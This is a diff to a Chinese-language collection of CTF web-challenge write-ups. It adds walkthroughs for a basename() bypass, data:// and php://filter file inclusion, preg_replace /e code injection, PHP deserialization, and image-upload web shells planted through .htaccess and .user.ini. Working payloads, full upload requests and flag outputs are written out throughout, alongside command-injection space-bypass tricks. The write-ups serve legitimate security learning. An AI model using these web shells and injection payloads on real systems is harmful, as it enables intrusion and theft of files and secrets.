@@ -703,9 +703,9 @@ index.php
 
 艹被骂了，查阅资料后看到了一些输入空格的方法：
 
-> $IFS	  //在这道题里不知道为什么不行
-> ${IFS}
-> $IFS$1 //$1改成$加其他数字都行
+> `$IFS`	  //在这道题里不知道为什么不行
+> `${IFS}`
+> `$IFS$1`  //$1改成$加其他数字都行
 > < 
 > <> 
 > {cat,flag.php}  //用逗号实现了空格功能
@@ -834,6 +834,81 @@ echo $chen."<br />";
 
 ------
 
+### [Zer0pts2020]Can you guess it?
+
+进入靶机后，可以看到Source超链接，点进去就是代码审计：
+
+```php+HTML
+<?php
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST['guess'])) {
+  $guess = (string) $_POST['guess'];
+  if (hash_equals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Can you guess it?</title>
+  </head>
+  <body>
+    <h1>Can you guess it?</h1>
+    <p>If your guess is correct, I'll give you the flag.</p>
+    <p><a href="?source">Source</a></p>
+    <hr>
+<?php if (isset($message)) { ?>
+    <p><?= $message ?></p>
+<?php } ?>
+    <form action="index.php" method="POST">
+      <input type="text" name="guess">
+      <input type="submit">
+    </form>
+  </body>
+</html>
+```
+
+其中，一种解题路径是：
+
+```php
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+```
+
+`$_SERVER['PHP_SELF']`是一个超全局变量，它在 PHP 中用于获取当前正在执行脚本的文件名。
+
+`basename()`函数会返回路径中的文件名部分，但是它会去掉文件名开头的非ASCII值！对此，我们能用不可显字符绕过`basename()`函数的过滤（即后面加 %80 – %ff 的任意字符）。
+
+访问靶机的`/index.php/config.php/%ff?source`即可得到`flag`。
+
+> <?php
+> define('FLAG', 'flag{c289fab8-1ef4-4088-8f2e-ce61568cf458}');
+
+------
+
 ### [ZJCTF 2019]NiZhuanSiWei
 
 进入靶机后直接就是代码审计：
@@ -874,7 +949,7 @@ else{
 PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
 ```
 
-直接在`cmd`命令行用`php -r "var_dump(base64_decode(''))";`进行`base64`解码，得到源码信息。
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
 
 ```php
 C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo='));"
@@ -940,7 +1015,7 @@ echo serialize($a);
 /?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}
 ```
 
-或者可以用以下代码得到`O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`，这也可以是第三个参数`password`的值。
+或者可以用以下代码，传入`filter`的伪协议，将`flag.php`的源码以`base64`编码的形式读取出来，得到`O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`，这也可以是第三个参数`password`的值。
 
 ```php
 <?php
@@ -973,6 +1048,132 @@ if(2===3){
 }
 ?>
 ```
+
+------
+
+### [BJDCTF2020]ZJCTF，不过如此
+
+打开靶机后，发现这是道`PHP`代码审计与漏洞利用题。需要用`GET`请求方式传递`text`和`file`两个参数。
+
+```php
+<?php
+error_reporting(0);
+$text = $_GET["text"];
+$file = $_GET["file"];
+if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        die("Not now!");
+    }
+    include($file);  //next.php
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+我们可以利用`file_get_contents`函数支持的伪协议（如`data://`或`php://filter`），构造`payload`绕过条件。
+
+由第一个`if`语句的判断条件`file_get_contents($text,'r')==="I have a dream"`可知，第一个参数是`text=data://text/plain,I have a dream`。传递该值后看到 I have a dream。
+
+第二个参数`file`涉及到的关键代码如下：
+
+```php
+if(preg_match("/flag/",$file)){
+    die("Not now!");
+}
+include($file);  //next.php
+```
+
+由判断条件`preg_match("/flag/",$file)`可知，文件路径无法包含`flag`，它的注释中还提示了`next.php`。针对`php`文件，我们无法直接使用`file=next.php`查看源码内容，需要`base64`编码再解码后才能读取源码内容。
+
+通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。所以我们可以用`file=php://filter/read=convert.base64-encode/resource=next.php`来获取加密后的源码。
+
+第二个参数就是`file=php://filter/read=convert.base64-encode/resource=next.php`。
+
+构造`payload`向靶机发送`GET`请求。
+
+```
+?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
+```
+
+可以看到靶机信息如下：
+
+> ### I have a dream
+>
+> PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到`next.php`源码信息。
+
+```php
+C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K'));"
+string(300) "<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+    @eval($_GET['cmd']);
+}
+"
+```
+
+‌分析`next.php`中的漏洞‌：
+
+- `preg_replace`函数使用了`/e`修饰符（此漏洞在PHP 7.0+中已移除），`/e`修饰符结合`strtolower("\\1")`可实现代码注入，会将替换字符串当作`PHP`代码执行。‌‌
+- 正则表达式`/(' . $re . ')/ei`中，`$re`来自`GET`参数，`strtolower("\\1")`中的`\\1`表示引用第一个捕获组。当传入的参数匹配正则时，会执行`strtolower`函数，并将捕获组内容作为代码执行。‌
+- 通过`foreach`循环遍历GET参数，利用非标准参数名（如`\S*`）构造参数触发漏洞。‌
+- `getFlag()`函数包含`@eval($_GET['cmd'])`，是典型的代码执行后门。
+
+构造`payload`：`?id=1&\S*={${getFlag()}}&cmd=system("ls /");`。发送`GET`请求后，靶机会将其解析为一个数组。
+
+```php
+$_GET = [
+'id'  => '1',
+'\S*' => '{${getFlag()}}',
+'cmd' => 'system("ls /");'
+];
+```
+
+进入`foreach`循环时，`'id' => '1'` 找不到匹配项，返回原字符“1”。`\S*` 表示"匹配0个或多个非空白字符"，所以会匹配整个字符串`{${getFlag()}}`，即`'\S*' => '{${getFlag()}}'`，所以就会变成 `strtolower("{${getFlag()}}")`。而又因为`/e`修饰符 ，程序运行时会先执行里面的`${getFlag()}`，然后执行传递参数`cmd=system('ls /')`，返回结果再执行`strtolower()`将返回结果字符串转为小写。
+
+构造完整的`payload`执行`ls /`。
+
+```
+?text=data://text/plain,I%20have%20a%20dream&file=next.php&id=1&\S*={${getFlag()}}&cmd=system("ls%20/");
+```
+
+可以看到靶机信息如下：
+
+> ### I have a dream
+>
+> data://text/plain,I have a dream next.php 1 bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var system("ls /");
+
+接着构造完整的`payload`执行`cat /flag`。
+
+```
+?text=data://text/plain,I%20have%20a%20dream&file=next.php&id=1&\S*={${getFlag()}}&cmd=system("cat%20/flag");
+```
+
+可以看到靶机信息如下：
+
+> ### I have a dream
+>
+> data://text/plain,I have a dream next.php 1 flag{2a3ecf46-b131-4b17-9938-13360d37b486} system("cat /flag");
+
+提交`flag{2a3ecf46-b131-4b17-9938-13360d37b486}`即可。
 
 ------
 
@@ -2005,7 +2206,7 @@ Connection: keep-alive
 Content-Disposition: form-data; name="uploaded"; filename="1.jpg"
 Content-Type: image/jpeg
 
-<script language="php">@eval($_POST['shell'])</script>
+<script language="php">@eval($_POST['shell']);</script>
 ------WebKitFormBoundaryZO1P0zAAsKMQLxcC
 Content-Disposition: form-data; name="submit"
 
@@ -2018,6 +2219,161 @@ Content-Disposition: form-data; name="submit"
 > /var/www/html/upload/0c80df51c2288c1304a7b1190c0aa12d/1.jpg succesfully uploaded!
 
 用`AntSword`连接后，在`/flag`文件中成功拿到`flag{328870e7-46c1-445d-80cf-ba5b3f3d96e2}`。
+
+------
+
+### [SUCTF 2019]CheckIn
+
+直接上传`.php`文件会显示 illegal suffix!，而上传`.htaccess`文件会显示 exif_imagetype:not image!。
+
+```htaccess
+AddType application/x-httpd-php .jpg
+```
+
+修改`.htaccess`文件内容，针对所有匹配`.jpg`扩展名的文件，将它们当作`PHP`脚本执行。
+
+```htaccess
+#define width 16
+#define height 7
+<FilesMatch "\.jpg">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+用`Burp Suite`抓包修改`Content-Type: image/jpeg`后上传成功。
+
+```
+POST /index.php HTTP/1.1
+Host: 8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
+Content-Length: 413
+Cache-Control: max-age=0
+Origin: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqJGf9Dmj9bGkFTKT
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundaryqJGf9Dmj9bGkFTKT
+Content-Disposition: form-data; name="fileUpload"; filename=".htaccess"
+Content-Type: image/jpeg
+
+#define width 16
+#define height 7
+<FilesMatch "\.jpg">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+------WebKitFormBoundaryqJGf9Dmj9bGkFTKT
+Content-Disposition: form-data; name="upload"
+
+提交
+------WebKitFormBoundaryqJGf9Dmj9bGkFTKT--
+```
+
+上传成功后，靶机显示信息如下：
+
+> Your dir uploads/331f5a2fec4659f9c8cd3a470a780b69
+> Your files :
+> array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(9) "index.php" }
+
+用`Burp Suite`修改`.php`后缀为`.jpg`后还是上传失败，需要添加图片文件头标识`GIF89a`绕过。
+
+```
+POST /index.php HTTP/1.1
+Host: 8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
+Content-Length: 361
+Cache-Control: max-age=0
+Origin: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary65XygUUzNRcwaLhd
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundary65XygUUzNRcwaLhd
+Content-Disposition: form-data; name="fileUpload"; filename="1.jpg"
+Content-Type: image/jpeg
+
+GIF89a
+<script language="php">@eval($_POST['shell']);</script>
+------WebKitFormBoundary65XygUUzNRcwaLhd
+Content-Disposition: form-data; name="upload"
+
+提交
+------WebKitFormBoundary65XygUUzNRcwaLhd--
+```
+
+上传成功后，靶机信息如下：
+
+> Your dir uploads/331f5a2fec4659f9c8cd3a470a780b69
+> Your files :
+> array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(5) "1.jpg" [4]=> string(9) "index.php" }
+
+用`AntSword`连接靶机失败。尝试使用`.user.ini`服务器配置文件解析图片木马，该配置文件的漏洞在于能够通过更改服务器配置项进而执行程序。`php.ini`中的配置项`auto_prepend_file`相当于`require()`函数，能够执行函数里面的`php`文件 ，该配置文件的作用在于执行`php`文件时，会默认优先扫描该文件所在目录下的`ini`文件。
+
+> #### .user.ini 和 .htaccess 区别
+>
+> - 适用范围：.htaccess 仅用于 Apache；.user.ini 支持 Apache、Nginx 等（PHP 5.3.0 + 、fastcgi 模式 ）。
+> - 功能侧重：.htaccess 是 Apache 目录网页配置，实现重定向、权限控制等；.user.ini 主要自定义 PHP 配置，常用于构造后门 。
+> - 生效机制：.htaccess 需开启 AllowOverride，遍历目录查找，影响性能；.user.ini 从执行文件目录向上扫，满足条件（PHP 版本等 ）修改即生效 。
+> - 使用限制：.htaccess 受 AllowOverride 限制，主配置可改时不建议用；.user.ini 依赖同目录 .php 文件，且仅识别部分模式配置 。
+
+```
+GIF89a
+auto_prepend_file=1.jpg
+```
+
+将`user.ini`文件上传后，配置项`auto_prepend_file=1.jpg`会将其添加到文件上传目录的`index.php`中。同样需要抓包修改`Content-Type: image/jpeg`才能上传成功。
+
+```
+POST /index.php HTTP/1.1
+Host: 8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
+Content-Length: 333
+Cache-Control: max-age=0
+Origin: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1HRSQkpaJ1wSpN9D
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundary1HRSQkpaJ1wSpN9D
+Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
+Content-Type: image/jpeg
+
+GIF89a
+auto_prepend_file=1.jpg
+------WebKitFormBoundary1HRSQkpaJ1wSpN9D
+Content-Disposition: form-data; name="upload"
+
+提交
+------WebKitFormBoundary1HRSQkpaJ1wSpN9D--
+```
+
+上传成功后，靶机信息如下：
+
+> Your dir uploads/331f5a2fec4659f9c8cd3a470a780b69
+> Your files :
+> array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(9) ".user.ini" [4]=> string(5) "1.jpg" [5]=> string(9) "index.php" }
+
+访问`uploads/331f5a2fec4659f9c8cd3a470a780b69`，可以看到`GIF89a`。我们用`HackBar`构造`POST`请求，传递参数`shell=phpinfo();`可以在靶机看到`PHP`相关信息。
+
+传递参数`shell=var_dump(scandir("/"));`可以查看靶机的根目录信息。
+
+> GIF89a array(31) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(16) ".supervisor.sock" [4]=> string(3) "app" [5]=> string(3) "bin" [6]=> string(4) "boot" [7]=> string(8) "clean.sh" [8]=> string(3) "dev" [9]=> string(13) "docker.stderr" [10]=> string(13) "docker.stdout" [11]=> string(10) "entrypoint" [12]=> string(14) "entrypoint.cmd" [13]=> string(12) "entrypoint.d" [14]=> string(3) "etc" [15]=> string(4) "flag" [16]=> string(4) "home" [17]=> string(3) "lib" [18]=> string(5) "lib64" [19]=> string(5) "media" [20]=> string(3) "mnt" [21]=> string(3) "opt" [22]=> string(4) "proc" [23]=> string(4) "root" [24]=> string(3) "run" [25]=> string(4) "sbin" [26]=> string(3) "srv" [27]=> string(3) "sys" [28]=> string(3) "tmp" [29]=> string(3) "usr" [30]=> string(3) "var" }
+
+传递参数`shell=var_dump(file_get_contents("/flag"));`可以获取`/flag`文件的内容信息。
+
+> GIF89a string(43) "flag{d9ea66d6-5451-481b-b31f-98e0845cc879} "
 
 ------
 
@@ -2095,6 +2451,161 @@ Login Success!
 Hello Dad！
 Your password is 'flag{76f8ba35-4123-46d5-8a3e-2b034065588f}'
 ```
+
+------
+
+### [网鼎杯 2020 青龙组]AreUSerialz
+
+进入靶机后，页面信息如下，代码审计题，并且是`PHP`反序列化漏洞题。
+
+```php
+<?php
+include("flag.php");
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+}
+```
+
+该题目提供了一个 `FileHandler` 类，包含 `op`、`filename` 和 `content` 三个`protected`属性的变量。核心逻辑涉及反序列化过程中自动调用的 `__destruct()` 方法，以及通过弱类型比较绕过安全检查来读取任意文件（如 `flag.php`）。
+
+关键漏洞点分析：
+
+- **`__destruct()` 方法的强类型比较**‌：
+  - 在对象销毁时，`__destruct()` 会检查 `$this->op === "2"`（强类型比较）。如果 `op` 的值是字符串 `"2"`，则将其重置为 `"1"` 并执行 `process()`，导致读取文件的操作被跳过。
+  - ‌**绕过方式**‌：由于 `process()` 中的比较是弱类型（`$this->op == "1"`），只需将 `op` 设为数字 `2`（如 `i:2`），即可在弱比较中触发 `read()` 函数。
+- ‌**`protected` 属性的序列化问题**‌：
+  - `protected` 属性在序列化时会包含空字符（`\0`），而题目通过 `is_valid()` 函数过滤不可打印字符（ASCII 32-125），导致直接序列化失败。
+  - ‌**绕过方式**‌：
+    - 利用 PHP 7.1+ 对变量类型不敏感的特性，将 `protected` 改为 `public`，避免空字符插入。
+    - 或通过替换序列化字符串中的 `s:` 为 `S:`（十六进制表示），并用 `\00` 替代空字符，绕过校验。
+- ‌**文件读取与输出**‌：
+  - `read()` 方法使用 `file_get_contents()` 读取文件，但内容不会直接输出。需结合 `php://filter` 协议（如 `convert.base64-encode`）编码输出，或通过 `filter` 协议读取源码。
+
+构造`payload`时，需要赋值`op=2`，`filename=flag.php`，并绕过字符校验。修改`FileHandler`如下：
+
+```php
+<?php
+	class FileHandler {
+		public $op = 2;
+		public $filename = "flag.php";
+		public $content = "";
+	}
+	$a = new FileHandler();
+	echo(serialize($a));
+?>
+// O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
+```
+
+因为`file_get_contents()`是支持`php`伪协议的，所以能传入`filter`将`flag.php`的源码以`base64`编码的形式读取出来，即`php://filter/read=convert.base64-encode/resource=flag.php`。修改代码如下，当然也可以直接修改上述代码的`filename`。
+
+```php
+<?php
+class FileHandler {
+    public $op;
+    public $filename;
+    public $content;
+    
+    function __construct($op,$filename,$content) {
+        $this->op=$op;
+        $this->filename=$filename;
+        $this->content=$content;
+    }
+}
+
+$a = new FileHandler(2,'flag.php','');
+echo serialize($a);
+// O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
+$b = new FileHandler(2,'php://filter/read=convert.base64-encode/resource=flag.php','');
+echo "<br>";
+echo serialize($b);
+// O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}
+```
+
+`GET`请求传递参数`str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}`，可以看到靶机页面如下：
+
+> [Result]:
+> PD9waHAgJGZsYWc9J2ZsYWd7MzU3ODI1ZjctNzMzMy00ZDg4LTk2ZDktMzBlZThlN2U0YmQ2fSc7Cg==
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到`flag`信息。
+
+```bash
+C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgJGZsYWc9J2ZsYWd7MzU3ODI1ZjctNzMzMy00ZDg4LTk2ZDktMzBlZThlN2U0YmQ2fSc7Cg=='));"
+string(58) "<?php $flag='flag{357825f7-7333-4d88-96d9-30ee8e7e4bd6}';
+```
+
+提交`flag`即可。
 
 ------
 
